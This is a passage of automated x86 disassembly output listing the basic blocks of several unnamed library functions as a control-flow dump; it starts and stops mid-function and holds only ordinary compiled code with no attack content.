0xb01b540:	test	byte ptr [esi - 0x1c], 1
0xb01b544:	jne	0xb01b560
None
|
|
|
v
0xb01b363:	mov	eax, dword ptr [esp + 0x68]
0xb01b367:	mov	esi, dword ptr [esp + 0x34]
0xb01b36b:	mov	dword ptr [esp + 0x1c], 0
0xb01b373:	mov	dword ptr [esp + 0x18], 0
0xb01b37b:	mov	dword ptr [esp + 0x14], eax
0xb01b37f:	mov	eax, dword ptr [esp + 0x2c]
0xb01b383:	mov	dword ptr [esp + 4], esi
0xb01b387:	mov	esi, dword ptr [esp + 0x38]
0xb01b38b:	mov	dword ptr [esp + 0x10], 0
0xb01b393:	mov	dword ptr [esp + 8], ebp
0xb01b397:	mov	dword ptr [esp + 0xc], eax
0xb01b39b:	mov	eax, dword ptr [esi + 4]
0xb01b39e:	mov	dword ptr [esp], eax
0xb01b3a1:	call	edi
None
|
|
|
v
0xb01b528:	mov	ebp, edi
0xb01b52a:	mov	eax, dword ptr [ebp + 8]
0xb01b52d:	mov	edi, dword ptr [ebp + 0x10]
0xb01b530:	test	eax, eax
0xb01b532:	jne	0xb01b581
None
|
|
|
v
0xb01b2d0:	lea	eax, dword ptr [edx + edx*8]
0xb01b2d3:	lea	eax, dword ptr [esi + eax*4]
0xb01b2d6:	mov	edi, eax
0xb01b2d8:	mov	dword ptr [eax + 8], ecx
0xb01b2db:	mov	dword ptr [esp + 0x3c], eax
0xb01b2df:	mov	eax, dword ptr [esp + 0x64]
0xb01b2e3:	mov	dword ptr [edi + 0xc], eax
0xb01b2e6:	mov	eax, dword ptr [esi + 4]
0xb01b2e9:	mov	edi, dword ptr [eax + 0x14]
0xb01b2ec:	mov	eax, dword ptr [eax]
0xb01b2ee:	test	eax, eax
0xb01b2f0:	je	0xb01b2fc
None
|
|
|
v
0xb01b4e3:	nop	
0xb01b4e5:	nop	
0xb01b4e7:	nop	
0xb01b4e9:	nop	
0xb01b4eb:	nop	
0xb01b4ed:	nop	
0xb01b4ef:	nop	
0xb01b4f0:	push	ebp
0xb01b4f1:	push	edi
0xb01b4f2:	mov	edi, eax
0xb01b4f4:	push	esi
0xb01b4f5:	push	ebx
0xb01b4f6:	sub	esp, 0x1c
0xb01b4f9:	mov	eax, dword ptr [eax + 4]
0xb01b4fc:	call	0xb1267db
None
|
|
|
v
0xb01b560:	mov	edi, dword ptr [esp + 4]
0xb01b564:	mov	dword ptr [esp], edi
0xb01b567:	call	0xb017470
None
|
|
|
v
0xb01b3d8:	add	esp, 0x4c
0xb01b3db:	mov	edx, 8
0xb01b3e0:	pop	ebx
0xb01b3e1:	mov	eax, edx
0xb01b3e3:	pop	esi
0xb01b3e4:	pop	edi
0xb01b3e5:	pop	ebp
0xb01b3e6:	ret	0xc
None
|
|
|
v
0xb01b534:	mov	dword ptr [esp], ebp
0xb01b537:	call	0xb017470
None
|
|
|
v
0xb01b35b:	mov	dword ptr [esp], edi
0xb01b35e:	call	0xb123900
None
|
|
|
v
0xb01b3f0:	mov	dword ptr [esp], edi
0xb01b3f3:	mov	dword ptr [esp + 0x2c], edx
0xb01b3f7:	call	0xb123900
None
|
|
|
v
0xb01b3a8:	mov	edi, dword ptr [esp + 0x60]
0xb01b3ac:	mov	edx, dword ptr [edi]
0xb01b3ae:	test	edx, edx
0xb01b3b0:	je	0xb01b488
None
|
|
|
v
0xb01b28e:	add	ebx, 0x18fd72
0xb01b294:	cmp	eax, 0xff
0xb01b297:	mov	dword ptr [esp + 0x2c], ecx
0xb01b29b:	je	0xb01b3d8
None
|
|
|
v
0xb01b340:	mov	edx, dword ptr [ebp]
0xb01b343:	cmp	edx, dword ptr [esp + 0x30]
0xb01b347:	je	0xb01b3a8
None
|
|
|
v
0xb01b54d:	mov	dword ptr [esp], eax
0xb01b550:	call	0xb017470
None
|
|
|
v
0xb01b2f2:	ror	edi, 9
0xb01b2f5:	xor	edi, dword ptr gs:[0x18]
0xb01b2fc:	test	ebp, ebp
0xb01b2fe:	je	0xb01b3f0
None
|
|
|
v
0xb01b555:	test	byte ptr [esi - 0x1c], 1
0xb01b559:	jne	0xb01b560
None
|
|
|
v
0xb01b32d:	lea	eax, dword ptr [esi + 8]
0xb01b330:	mov	dword ptr [esp + 0x34], eax
0xb01b334:	mov	dword ptr [esp + 0x38], esi
0xb01b338:	jmp	0xb01b35b
None
|
|
|
v
0xb01b450:	add	ecx, 1
0xb01b453:	add	esi, 0x24
0xb01b456:	mov	dword ptr [esi - 0x10], 0
0xb01b45d:	cmp	edx, ecx
0xb01b45f:	jae	0xb01b450
None
|
|
|
v
0xb01b546:	mov	eax, dword ptr [esi - 0x24]
0xb01b549:	test	eax, eax
0xb01b54b:	je	0xb01b55b
None
|
|
|
v
0xb01b2b4:	mov	eax, dword ptr [esp + 0x68]
0xb01b2b8:	mov	dword ptr [eax], 0
0xb01b2be:	mov	eax, dword ptr [esp + 0x60]
0xb01b2c2:	test	eax, eax
0xb01b2c4:	je	0xb01b480
None
|
|
|
v
0xb01b518:	mov	ebp, dword ptr [esi - 4]
0xb01b51b:	test	ebp, ebp
0xb01b51d:	jne	0xb01b52a
None
|
|
|
v
0xb01b589:	jmp	0xb01b534
None
|
|
|
v
0xb01b3fc:	mov	eax, dword ptr [esp + 0x3c]
0xb01b400:	cmp	dword ptr [eax + 8], 1
0xb01b404:	mov	dword ptr [esp + 0x1c], 0
0xb01b40c:	mov	dword ptr [esp + 0x10], 0
0xb01b414:	sbb	eax, eax
0xb01b416:	not	eax
0xb01b418:	add	eax, 2
0xb01b41b:	mov	dword ptr [esp + 0x18], eax
0xb01b41f:	mov	eax, dword ptr [esp + 0x68]
0xb01b423:	mov	dword ptr [esp + 0xc], 0
0xb01b42b:	mov	dword ptr [esp + 8], 0
0xb01b433:	mov	dword ptr [esp + 0x14], eax
0xb01b437:	lea	eax, dword ptr [esi + 8]
0xb01b43a:	mov	dword ptr [esp + 4], eax
0xb01b43e:	mov	eax, dword ptr [esi + 4]
0xb01b441:	mov	dword ptr [esp], eax
0xb01b444:	call	edi
None
|
|
|
v
0xb01b304:	mov	eax, dword ptr [ebp]
0xb01b307:	test	eax, eax
0xb01b309:	mov	dword ptr [esp + 0x30], eax
0xb01b30d:	je	0xb01b3f0
None
|
|
|
v
0xb01b44e:	xor	ecx, ecx
0xb01b450:	add	ecx, 1
0xb01b453:	add	esi, 0x24
0xb01b456:	mov	dword ptr [esi - 0x10], 0
0xb01b45d:	cmp	edx, ecx
0xb01b45f:	jae	0xb01b450
None
|
|
|
v
0xb01b2fc:	test	ebp, ebp
0xb01b2fe:	je	0xb01b3f0
None
|
|
|
v
0xb01b581:	mov	edx, dword ptr [ebp + 0xc]
0xb01b584:	mov	dword ptr [esp], edx
0xb01b587:	call	eax
None
|
|
|
v
0xb01b2a1:	mov	eax, dword ptr [eax]
0xb01b2a3:	mov	ebp, edx
0xb01b2a5:	lea	edx, dword ptr [eax - 1]
0xb01b2a8:	mov	eax, dword ptr [esp + 0x68]
0xb01b2ac:	test	eax, eax
0xb01b2ae:	je	0xb01b4b9
None
|
|
|
v
0xb01b313:	mov	eax, dword ptr [esp + 0x60]
0xb01b317:	test	eax, eax
0xb01b319:	je	0xb01b48f
None
|
|
|
v
0xb01b51f:	jmp	0xb01b540
None
|
|
|
v
0xb01b55b:	add	esi, 0x24
0xb01b55e:	jmp	0xb01b518
None
|
|
|
v
0xb01b579:	add	esp, 0x1c
0xb01b57c:	pop	ebx
0xb01b57d:	pop	esi
0xb01b57e:	pop	edi
0xb01b57f:	pop	ebp
0xb01b580:	ret	
None
|
|
|
v
0xb01b501:	add	ebx, 0x18faff
0xb01b507:	lea	esi, dword ptr [edi + 0x2c]
0xb01b50a:	mov	dword ptr [esp + 4], edi
0xb01b50e:	mov	dword ptr [esp + 8], eax
0xb01b512:	mov	eax, dword ptr [edi]
0xb01b514:	mov	dword ptr [esp + 0xc], eax
0xb01b518:	mov	ebp, dword ptr [esi - 4]
0xb01b51b:	test	ebp, ebp
0xb01b51d:	jne	0xb01b52a
None
|
|
|
v
0xb01b31f:	mov	eax, dword ptr [esp + 0x60]
0xb01b323:	mov	eax, dword ptr [eax]
0xb01b325:	test	eax, eax
0xb01b327:	je	0xb01b48f
None
|
|
|
v
0xb01b3a3:	cmp	eax, 4
0xb01b3a6:	je	0xb01b340
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01b5c0
TOTAL BLOCKS :6
0xb01b5fc:	add	esp, 0x28
0xb01b5ff:	pop	ebx
0xb01b600:	ret	
None
|
|
|
v
0xb01b5f7:	mov	eax, dword ptr [eax]
0xb01b5f9:	mov	eax, dword ptr [eax + 4]
0xb01b5fc:	add	esp, 0x28
0xb01b5ff:	pop	ebx
0xb01b600:	ret	
None
|
|
|
v
0xb01b5f3:	test	eax, eax
0xb01b5f5:	je	0xb01b608
None
|
|
|
v
0xb01b5c0:	push	ebx
0xb01b5c1:	call	0xb1267db
None
|
|
|
v
0xb01b5c6:	add	ebx, 0x18fa3a
0xb01b5cc:	sub	esp, 0x28
0xb01b5cf:	mov	dword ptr [esp + 0x18], eax
0xb01b5d3:	lea	eax, dword ptr [ebx - 0x18fa70]
0xb01b5d9:	mov	dword ptr [esp + 8], eax
0xb01b5dd:	lea	eax, dword ptr [ebx + 0x3664]
0xb01b5e3:	mov	dword ptr [esp + 4], eax
0xb01b5e7:	lea	eax, dword ptr [esp + 0x18]
0xb01b5eb:	mov	dword ptr [esp], eax
0xb01b5ee:	call	0xb0e7ee0
None
|
|
|
v
0xb01b608:	xor	eax, eax
0xb01b60a:	jmp	0xb01b5fc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01b6a0
TOTAL BLOCKS :13
0xb01b6e4:	mov	eax, dword ptr [esi]
0xb01b6e6:	call	0xb0244a0
None
|
|
|
v
0xb01b6c6:	mov	edi, dword ptr [esi + 0x20]
0xb01b6c9:	test	edi, edi
0xb01b6cb:	je	0xb01b6e6
None
|
|
|
v
0xb01b6a0:	push	edi
0xb01b6a1:	push	esi
0xb01b6a2:	mov	esi, eax
0xb01b6a4:	push	ebx
0xb01b6a5:	sub	esp, 0x10
0xb01b6a8:	mov	eax, dword ptr [eax]
0xb01b6aa:	call	0xb1267db
None
|
|
|
v
0xb01b6f8:	mov	eax, dword ptr [esi + 0x20]
0xb01b6fb:	test	eax, eax
0xb01b6fd:	je	0xb01b6f1
None
|
|
|
v
0xb01b6f1:	add	esp, 0x10
0xb01b6f4:	pop	ebx
0xb01b6f5:	pop	esi
0xb01b6f6:	pop	edi
0xb01b6f7:	ret	
None
|
|
|
v
0xb01b6df:	mov	dword ptr [esp], esi
0xb01b6e2:	call	edi
None
|
|
|
v
0xb01b6af:	add	ebx, 0x18f951
0xb01b6b5:	test	eax, eax
0xb01b6b7:	je	0xb01b6f8
None
|
|
|
v
0xb01b6b9:	mov	ecx, dword ptr [esi + 8]
0xb01b6bc:	lea	edx, dword ptr [ecx - 1]
0xb01b6bf:	test	edx, edx
0xb01b6c1:	mov	dword ptr [esi + 8], edx
0xb01b6c4:	jne	0xb01b6f1
None
|
|
|
v
0xb01b6cd:	ror	edi, 9
0xb01b6d0:	xor	edi, dword ptr gs:[0x18]
0xb01b6d7:	mov	dword ptr [esp], edi
0xb01b6da:	call	0xb123900
None
|
|
|
v
0xb01b6e6:	call	0xb0244a0
None
|
|
|
v
0xb01b6eb:	mov	dword ptr [esi], 0
0xb01b6f1:	add	esp, 0x10
0xb01b6f4:	pop	ebx
0xb01b6f5:	pop	esi
0xb01b6f6:	pop	edi
0xb01b6f7:	ret	
None
|
|
|
v
0xb01b6ff:	lea	eax, dword ptr [ebx - 0x4b065]
0xb01b705:	mov	dword ptr [esp + 0xc], eax
0xb01b709:	lea	eax, dword ptr [ebx - 0x4b080]
0xb01b70f:	mov	dword ptr [esp + 4], eax
0xb01b713:	lea	eax, dword ptr [ebx - 0x467c0]
0xb01b719:	mov	dword ptr [esp + 8], 0xeb
0xb01b721:	mov	dword ptr [esp], eax
0xb01b724:	call	0xb027820
None
|
|
|
v
0xb01b729:	lea	esi, dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01b730
TOTAL BLOCKS :161
0xb01bf3f:	mov	ecx, dword ptr [ebp - 0x58]
0xb01bf42:	sub	esp, 0x30
0xb01bf45:	lea	eax, dword ptr [esp + 0x1b]
0xb01bf49:	and	eax, 0xfffffff0
0xb01bf4c:	mov	esi, eax
0xb01bf4e:	mov	dword ptr [eax], ecx
0xb01bf50:	mov	dword ptr [esp], ecx
0xb01bf53:	mov	dword ptr [ebp - 0x50], eax
0xb01bf56:	call	0xb07ae80
None
|
|
|
v
0xb01b945:	test	eax, eax
0xb01b947:	je	0xb01b971
None
|
|
|
v
0xb01bd71:	imul	eax, dword ptr [ebp - 0x2c], 0x3c
0xb01bd75:	mov	edx, dword ptr [ebp - 0x30]
0xb01bd78:	mov	eax, dword ptr [edx + eax + 0xc]
0xb01bd7c:	mov	dword ptr [esi + 0x10], eax
0xb01bd7f:	mov	eax, dword ptr [ecx + 0x10]
0xb01bd82:	mov	dword ptr [esi + 8], 1
0xb01bd89:	mov	dword ptr [esi + 0x38], 0
0xb01bd90:	mov	eax, dword ptr [eax + 0x10]
0xb01bd93:	cmp	byte ptr [eax], 0x2f
0xb01bd96:	jne	0xb01bd30
None
|
|
|
v
0xb01bce8:	mov	eax, dword ptr [eax + 0x14]
0xb01bceb:	add	edx, 1
0xb01bcee:	test	eax, eax
0xb01bcf0:	jne	0xb01bce8
None
|
|
|
v
0xb01b82c:	test	edi, edi
0xb01b82e:	je	0xb01b849
None
|
|
|
v
0xb01b84b:	lea	esp, dword ptr [ebp - 0xc]
0xb01b84e:	mov	eax, ecx
0xb01b850:	pop	ebx
0xb01b851:	pop	esi
0xb01b852:	pop	edi
0xb01b853:	pop	ebp
0xb01b854:	ret	0xc
None
|
|
|
v
0xb01b80a:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b80d:	mov	dword ptr [esp], esi
0xb01b810:	call	eax
None
|
|
|
v
0xb01bfc5:	mov	eax, esi
0xb01bfc7:	add	edi, 1
0xb01bfca:	mov	dword ptr [ebp - 0x2c], ecx
0xb01bfcd:	add	esi, 0x3c
0xb01bfd0:	call	0xb01b6a0
None
|
|
|
v
0xb01b949:	jns	0xb01b930
None
|
|
|
v
0xb01bea9:	mov	ecx, dword ptr [ebp - 0x34]
0xb01beac:	mov	edx, dword ptr [ebp - 0x38]
0xb01beaf:	mov	dword ptr [esp + 4], ecx
0xb01beb3:	mov	dword ptr [esp + 8], edx
0xb01beb7:	mov	dword ptr [esp], eax
0xb01beba:	call	0xb07d0b0
None
|
|
|
v
0xb01bfd5:	mov	eax, dword ptr [ebp + 0x10]
0xb01bfd8:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01bfdb:	cmp	edi, dword ptr [eax]
0xb01bfdd:	jb	0xb01bfc5
None
|
|
|
v
0xb01bbd0:	mov	eax, dword ptr [edi + 0x10]
0xb01bbd3:	test	eax, eax
0xb01bbd5:	je	0xb01bbfe
None
|
|
|
v
0xb01bc4a:	mov	dword ptr [ebp - 0x3c], edi
0xb01bc4d:	jmp	0xb01bb00
None
|
|
|
v
0xb01b9c0:	mov	eax, dword ptr [ebp - 0x44]
0xb01b9c3:	test	eax, eax
0xb01b9c5:	mov	edi, eax
0xb01b9c7:	jne	0xb01b9db
None
|
|
|
v
0xb01c02c:	sub	dword ptr [esi + 8], 1
0xb01c030:	cmp	dword ptr [ebp - 0x30], edi
0xb01c033:	jbe	0xb01c04d
None
|
|
|
v
0xb01b999:	mov	esi, dword ptr [ebp - 0x48]
0xb01b99c:	test	esi, esi
0xb01b99e:	je	0xb01bc65
None
|
|
|
v
0xb01bebf:	mov	dword ptr [edi + 0xc], esi
0xb01bec2:	mov	dword ptr [edi + 4], eax
0xb01bec5:	mov	eax, dword ptr [ebp - 0x30]
0xb01bec8:	mov	dword ptr [edi + 8], eax
0xb01becb:	mov	eax, dword ptr [ebp - 0x5c]
0xb01bece:	mov	dword ptr [esp], edi
0xb01bed1:	mov	dword ptr [esp + 8], eax
0xb01bed5:	mov	eax, dword ptr [ebp - 0x60]
0xb01bed8:	mov	dword ptr [esp + 4], eax
0xb01bedc:	call	0xb0e7d80
None
|
|
|
v
0xb01bfb5:	mov	eax, dword ptr [ebp + 0x10]
0xb01bfb8:	add	edi, 1
0xb01bfbb:	cmp	dword ptr [eax], edi
0xb01bfbd:	jbe	0xb01bfdf
None
|
|
|
v
0xb01bc05:	mov	eax, dword ptr [ebp - 0x44]
0xb01bc08:	test	eax, eax
0xb01bc0a:	je	0xb01bb00
None
|
|
|
v
0xb01b918:	je	0xb01bc82
None
|
|
|
v
0xb01bbba:	mov	eax, dword ptr [ebp - 0x2c]
0xb01bbbd:	mov	dword ptr [edi + 0x10], eax
0xb01bbc0:	mov	eax, dword ptr [ebp - 0x34]
0xb01bbc3:	mov	dword ptr [edi + 0x14], eax
0xb01bbc6:	mov	edi, dword ptr [ebp - 0x50]
0xb01bbc9:	lea	esi, dword ptr [esi]
0xb01bbd0:	mov	eax, dword ptr [edi + 0x10]
0xb01bbd3:	test	eax, eax
0xb01bbd5:	je	0xb01bbfe
None
|
|
|
v
0xb01b971:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b974:	mov	dword ptr [ebp - 0x2c], edi
0xb01b977:	mov	edi, eax
0xb01b979:	lea	esi, dword ptr [esi]
0xb01b980:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b983:	mov	esi, dword ptr [eax + 4]
0xb01b986:	cmp	byte ptr [esi], 0x2d
0xb01b989:	jne	0xb01ba38
None
|
|
|
v
0xb01bdfe:	mov	eax, dword ptr [esi + 0x18]
0xb01be01:	test	eax, eax
0xb01be03:	je	0xb01bd3d
None
|
|
|
v
0xb01c03b:	mov	eax, esi
0xb01c03d:	add	edi, 1
0xb01c040:	call	0xb01b6a0
None
|
|
|
v
0xb01be5b:	mov	dword ptr [esp], edi
0xb01be5e:	mov	dword ptr [ebp - 0x34], edi
0xb01be61:	add	eax, 1
0xb01be64:	mov	dword ptr [ebp - 0x2c], eax
0xb01be67:	call	0xb07ae80
None
|
|
|
v
0xb01bba8:	jne	0xb01bb00
None
|
|
|
v
0xb01b7d6:	mov	edx, dword ptr [eax + 0xc]
0xb01b7d9:	mov	dword ptr [esi + 0x14], edx
0xb01b7dc:	mov	edx, dword ptr [eax + 0x10]
0xb01b7df:	mov	eax, dword ptr [eax + 0x14]
0xb01b7e2:	mov	dword ptr [esi + 0x18], 0
0xb01b7e9:	mov	dword ptr [esi + 0x1c], edx
0xb01b7ec:	mov	dword ptr [esi + 0x20], eax
0xb01b7ef:	mov	eax, edx
0xb01b7f1:	test	eax, eax
0xb01b7f3:	je	0xb01b826
None
|
|
|
v
0xb01c045:	add	esi, 0x3c
0xb01c048:	cmp	dword ptr [ebp - 0x30], edi
0xb01c04b:	ja	0xb01c03b
None
|
|
|
v
0xb01bd3d:	sub	esi, 0x3c
0xb01bd40:	test	edi, edi
0xb01bd42:	mov	ecx, dword ptr [ecx + 0x14]
0xb01bd45:	lea	eax, dword ptr [edi - 1]
0xb01bd48:	je	0xb01be27
None
|
|
|
v
0xb01b7f5:	ror	eax, 9
0xb01b7f8:	xor	eax, dword ptr gs:[0x18]
0xb01b7ff:	mov	dword ptr [esp], eax
0xb01b802:	mov	dword ptr [ebp - 0x2c], eax
0xb01b805:	call	0xb123900
None
|
|
|
v
0xb01b9db:	mov	eax, dword ptr [edi]
0xb01b9dd:	mov	dword ptr [esp], esi
0xb01b9e0:	mov	dword ptr [esp + 4], eax
0xb01b9e4:	call	0xb07a740
None
|
|
|
v
0xb01b910:	mov	eax, dword ptr [ebp - 0x3c]
0xb01b913:	cmp	dword ptr [ebp - 0x2c], eax
0xb01b916:	jg	0xb01b958
None
|
|
|
v
0xb01ba77:	test	eax, eax
0xb01ba79:	je	0xb01b9c0
None
|
|
|
v
0xb01b9d0:	mov	edi, dword ptr [edi + 0x18]
0xb01b9d3:	test	edi, edi
0xb01b9d5:	je	0xb01bb60
None
|
|
|
v
0xb01b952:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01be09:	xor	eax, dword ptr gs:[0x18]
0xb01be10:	rol	eax, 9
0xb01be13:	sub	esi, 0x3c
0xb01be16:	mov	ecx, dword ptr [ecx + 0x14]
0xb01be19:	mov	dword ptr [esi + 0x54], eax
0xb01be1c:	test	edi, edi
0xb01be1e:	lea	eax, dword ptr [edi - 1]
0xb01be21:	jne	0xb01bd4e
None
|
|
|
v
0xb01b9e9:	test	eax, eax
0xb01b9eb:	jne	0xb01b9d0
None
|
|
|
v
0xb01b7cc:	test	eax, eax
0xb01b7ce:	mov	dword ptr [esi], eax
0xb01b7d0:	je	0xb01c02c
None
|
|
|
v
0xb01bba0:	mov	eax, dword ptr [ebp - 0x30]
0xb01bba3:	cmp	eax, dword ptr [edi + 0xc]
0xb01bba6:	jl	0xb01bbba
None
|
|
|
v
0xb01bc91:	mov	eax, dword ptr [ebp - 0x34]
0xb01bc94:	mov	eax, dword ptr [eax + 0x18]
0xb01bc97:	test	eax, eax
0xb01bc99:	mov	dword ptr [ebp - 0x34], eax
0xb01bc9c:	jne	0xb01b969
None
|
|
|
v
0xb01b849:	xor	ecx, ecx
0xb01b84b:	lea	esp, dword ptr [ebp - 0xc]
0xb01b84e:	mov	eax, ecx
0xb01b850:	pop	ebx
0xb01b851:	pop	esi
0xb01b852:	pop	edi
0xb01b853:	pop	ebp
0xb01b854:	ret	0xc
None
|
|
|
v
0xb01bb4c:	mov	eax, dword ptr [ebp - 0x38]
0xb01bb4f:	mov	dword ptr [ebp - 0x40], eax
0xb01bb52:	mov	eax, dword ptr [ebp - 0x30]
0xb01bb55:	mov	dword ptr [ebp - 0x3c], eax
0xb01bb58:	jmp	0xb01bb00
None
|
|
|
v
0xb01b844:	mov	eax, dword ptr [esi + 0x1c]
0xb01b847:	jmp	0xb01b7f1
None
|
|
|
v
0xb01bd60:	mov	dword ptr [esi + 0xc], eax
0xb01bd63:	mov	eax, dword ptr [ebp + 0x10]
0xb01bd66:	mov	edx, dword ptr [ebp - 0x2c]
0xb01bd69:	cmp	dword ptr [eax], edx
0xb01bd6b:	je	0xb01bf00
None
|
|
|
v
0xb01bbae:	mov	eax, dword ptr [ebp - 0x38]
0xb01bbb1:	cmp	eax, dword ptr [edi + 8]
0xb01bbb4:	jge	0xb01bb00
None
|
|
|
v
0xb01bd00:	mov	ecx, eax
0xb01bd02:	test	ecx, ecx
0xb01bd04:	mov	dword ptr [ebp - 0x30], eax
0xb01bd07:	mov	eax, dword ptr [ebp + 0x10]
0xb01bd0a:	je	0xb01bf1d
None
|
|
|
v
0xb01bfb3:	xor	ecx, ecx
0xb01bfb5:	mov	eax, dword ptr [ebp + 0x10]
0xb01bfb8:	add	edi, 1
0xb01bfbb:	cmp	dword ptr [eax], edi
0xb01bfbd:	jbe	0xb01bfdf
None
|
|
|
v
0xb01be36:	mov	eax, dword ptr [ebp - 0x48]
0xb01be39:	mov	edx, dword ptr [ebp + 8]
0xb01be3c:	mov	dword ptr [ebp - 0x3c], ecx
0xb01be3f:	test	eax, eax
0xb01be41:	cmove	eax, dword ptr [ebp - 0x4c]
0xb01be45:	test	edx, edx
0xb01be47:	mov	edx, dword ptr [ebp - 0x58]
0xb01be4a:	cmovne	edx, dword ptr [ebp + 8]
0xb01be4e:	mov	edi, eax
0xb01be50:	mov	dword ptr [esp], edx
0xb01be53:	mov	dword ptr [ebp - 0x40], edx
0xb01be56:	call	0xb07ae80
None
|
|
|
v
0xb01bf0d:	mov	ecx, dword ptr [ebp - 0x34]
0xb01bf10:	jmp	0xb01bd7c
None
|
|
|
v
0xb01c04d:	mov	ecx, 1
0xb01c052:	jmp	0xb01b84b
None
|
|
|
v
0xb01bc65:	mov	eax, dword ptr [ebp - 0x2c]
0xb01bc68:	mov	ecx, dword ptr [ebp - 0x34]
0xb01bc6b:	mov	esi, dword ptr [ebp - 0x4c]
0xb01bc6e:	add	edi, dword ptr [eax + 8]
0xb01bc71:	mov	eax, dword ptr [eax + 0xc]
0xb01bc74:	add	eax, dword ptr [ecx + 8]
0xb01bc77:	mov	dword ptr [ebp - 0x30], edi
0xb01bc7a:	mov	dword ptr [ebp - 0x38], eax
0xb01bc7d:	jmp	0xb01b9c0
None
|
|
|
v
0xb01b94b:	mov	edi, dword ptr [edi + 0x14]
0xb01b94e:	test	edi, edi
0xb01b950:	jne	0xb01b937
None
|
|
|
v
0xb01bbe7:	nop	
None
|
|
|
v
0xb01c067:	mov	edx, dword ptr [ebp - 0x2c]
0xb01c06a:	mov	ecx, eax
0xb01c06c:	lea	edi, dword ptr [edx - 2]
0xb01c06f:	mov	edx, dword ptr [ebp - 0x30]
0xb01c072:	imul	eax, edi, 0x3c
0xb01c075:	mov	dword ptr [edx + eax + 0x20], 0
0xb01c07d:	jmp	0xb01bfb5
None
|
|
|
v
0xb01ba1a:	mov	ecx, dword ptr [ebp - 0x3c]
0xb01ba1d:	mov	eax, dword ptr [ebp - 0x30]
0xb01ba20:	mov	edx, dword ptr [ebp - 0x38]
0xb01ba23:	cmp	eax, ecx
0xb01ba25:	cmovne	edx, dword ptr [ebp - 0x40]
0xb01ba29:	cmovne	eax, ecx
0xb01ba2c:	mov	dword ptr [ebp - 0x3c], eax
0xb01ba2f:	mov	dword ptr [ebp - 0x40], edx
0xb01ba32:	jmp	0xb01bb00
None
|
|
|
v
0xb01c057:	xor	eax, eax
0xb01c059:	xor	edx, edx
0xb01c05b:	jmp	0xb01bcf5
None
|
|
|
v
0xb01bc1a:	mov	eax, dword ptr [eax + 0x18]
0xb01bc1d:	test	eax, eax
0xb01bc1f:	nop	
0xb01bc20:	je	0xb01bc4a
None
|
|
|
v
0xb01bfa9:	mov	ecx, 1
0xb01bfae:	jmp	0xb01be36
None
|
|
|
v
0xb01c035:	imul	esi, edi, 0x3c
0xb01c038:	add	esi, dword ptr [ebp - 0x34]
0xb01c03b:	mov	eax, esi
0xb01c03d:	add	edi, 1
0xb01c040:	call	0xb01b6a0
None
|
|
|
v
0xb01b9c9:	jmp	0xb01bb60
None
|
|
|
v
0xb01b930:	mov	edi, dword ptr [edi + 0x1c]
0xb01b933:	test	edi, edi
0xb01b935:	je	0xb01b958
None
|
|
|
v
0xb01bd7c:	mov	dword ptr [esi + 0x10], eax
0xb01bd7f:	mov	eax, dword ptr [ecx + 0x10]
0xb01bd82:	mov	dword ptr [esi + 8], 1
0xb01bd89:	mov	dword ptr [esi + 0x38], 0
0xb01bd90:	mov	eax, dword ptr [eax + 0x10]
0xb01bd93:	cmp	byte ptr [eax], 0x2f
0xb01bd96:	jne	0xb01bd30
None
|
|
|
v
0xb01bd30:	mov	edx, esi
0xb01bd32:	mov	dword ptr [ebp - 0x2c], ecx
0xb01bd35:	call	0xb01d210
None
|
|
|
v
0xb01bcf2:	imul	eax, edx, 0x3c
0xb01bcf5:	mov	dword ptr [esp], eax
0xb01bcf8:	mov	dword ptr [ebp - 0x2c], edx
0xb01bcfb:	call	0xb0173f0
None
|
|
|
v
0xb01bd4e:	mov	dword ptr [ebp - 0x2c], edi
0xb01bd51:	mov	edi, eax
0xb01bd53:	test	edi, edi
0xb01bd55:	je	0xb01c082
None
|
|
|
v
0xb01ba38:	mov	eax, dword ptr [ebp - 0x2c]
0xb01ba3b:	mov	ecx, dword ptr [ebp - 0x34]
0xb01ba3e:	add	edi, dword ptr [eax + 8]
0xb01ba41:	mov	eax, dword ptr [eax + 0xc]
0xb01ba44:	add	eax, dword ptr [ecx + 8]
0xb01ba47:	mov	dword ptr [esp], esi
0xb01ba4a:	mov	dword ptr [ebp - 0x30], edi
0xb01ba4d:	mov	dword ptr [ebp - 0x38], eax
0xb01ba50:	mov	eax, dword ptr [ebp - 0x4c]
0xb01ba53:	mov	dword ptr [esp + 4], eax
0xb01ba57:	call	0xb07a740
None
|
|
|
v
0xb01ba02:	mov	eax, dword ptr [ebp - 0x30]
0xb01ba05:	cmp	dword ptr [ebp - 0x3c], eax
0xb01ba08:	jg	0xb01bb4c
None
|
|
|
v
0xb01bcad:	mov	eax, dword ptr [ecx + 0x18]
0xb01bcb0:	test	eax, eax
0xb01bcb2:	je	0xb01bcc6
None
|
|
|
v
0xb01bc18:	je	0xb01bc58
None
|
|
|
v
0xb01c082:	mov	eax, dword ptr [ebp - 0x3c]
0xb01c085:	mov	dword ptr [ebp - 0x34], ecx
0xb01c088:	mov	dword ptr [esp], eax
0xb01c08b:	call	0xb07ab00
None
|
|
|
v
0xb01b9f9:	cmp	dword ptr [ebp - 0x30], eax
0xb01b9fc:	je	0xb01bb1c
None
|
|
|
v
0xb01ba64:	mov	eax, dword ptr [ebp - 0x48]
0xb01ba67:	test	eax, eax
0xb01ba69:	je	0xb01ba7f
None
|
|
|
v
0xb01bda0:	test	eax, eax
0xb01bda2:	je	0xb01bfb3
None
|
|
|
v
0xb01c090:	mov	ecx, dword ptr [ebp - 0x34]
0xb01c093:	jmp	0xb01bd60
None
|
|
|
v
0xb01bf00:	mov	eax, dword ptr [ecx]
0xb01bf02:	mov	dword ptr [ebp - 0x34], ecx
0xb01bf05:	mov	dword ptr [esp], eax
0xb01bf08:	call	0xb07ab00
None
|
|
|
v
0xb01bcc6:	mov	ecx, dword ptr [ebp + 8]
0xb01bcc9:	mov	eax, dword ptr [ebp - 0x58]
0xb01bccc:	test	ecx, ecx
0xb01bcce:	cmovne	eax, dword ptr [ebp + 8]
0xb01bcd2:	mov	dword ptr [ebp - 0x3c], eax
